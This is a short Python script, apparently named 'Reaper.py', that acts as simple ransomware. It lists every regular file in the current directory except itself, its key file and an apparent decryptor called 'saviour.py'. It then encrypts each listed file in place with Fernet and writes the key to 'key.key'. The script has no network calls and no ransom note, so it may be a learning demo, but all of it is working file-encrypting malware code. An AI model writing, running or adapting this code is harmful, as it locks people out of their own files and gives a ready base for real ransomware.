import os
from cryptography.fernet import Fernet

targets = []

# This is main

def generate_key():
    key = Fernet.generate_key()

    with open("key.key", "wb") as key_file:
        key_file.write(key)

    return key


def gather_targets():
    for file in os.listdir():
        if file == "Reaper.py" or file == "key.key" or file == "saviour.py":
            continue

        if os.path.isdir(file):
            continue

        targets.append(file)


def encrypt(key):
    for file in targets:
        with open(file, "rb") as target_file:
            plain_text = target_file.read()
            cipher = Fernet(key).encrypt(plain_text)

        with open(file, "wb") as target_file:
            target_file.write(cipher)

    print("Done.")


gather_targets()
encrypt(generate_key())